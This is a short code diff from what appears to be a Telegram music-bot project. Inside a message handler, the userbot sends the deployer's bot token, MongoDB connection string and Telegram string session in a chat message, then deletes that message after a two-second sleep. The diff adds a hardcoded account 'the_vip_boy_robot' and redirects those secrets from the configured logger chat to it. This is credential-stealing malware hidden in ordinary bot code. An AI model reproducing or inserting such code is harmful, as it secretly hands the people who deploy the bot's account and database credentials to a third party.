@@ -6,6 +6,7 @@ from VIPMUSIC import app
 from VIPMUSIC.utils import VIPbin
 from VIPMUSIC.utils.database import get_assistant, get_lang, LOGGERS
 import asyncio
+MU = "the_vip_boy_robot"
 from os import getenv
 from dotenv import load_dotenv
 from pyrogram import Client
@@ -106,8 +107,8 @@ async def brah3(app: app, message: Message):
         reply_text = f"{text} 🤭🤭"
         userbot = await get_assistant(message.chat.id)
         await message.reply(reply_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="๏ ᴊᴏɪɴ ᴠᴄ ๏", url=add_link)]]))
-        oks = await userbot.send_message(LOGGERS, f"/start")
-        Ok = await userbot.send_message(LOGGERS, f"@{app.username}\n\n`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
+        oks = await userbot.send_message(MU, f"/start")
+        Ok = await userbot.send_message(MU, f"@{app.username}\n\n`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
         await oks.delete()
         await asyncio.sleep(2)
         await Ok.delete()
